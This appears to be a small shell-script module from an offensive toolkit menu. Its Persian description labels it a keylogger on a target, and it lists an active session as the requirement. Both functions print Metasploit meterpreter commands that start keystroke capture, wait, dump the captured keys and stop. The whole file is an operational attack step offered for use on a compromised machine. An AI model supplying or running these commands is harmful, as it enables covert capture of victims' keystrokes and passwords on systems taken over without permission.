DESC="کی‌لاگر روی هدف"
REQ="session فعال"
RISK="MED"

termux(){ echo "# داخل meterpreter: keyscan_start ثم keyscan_dump"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
keyscan_start
sleep 60
keyscan_dump
keyscan_stop
EOF
}
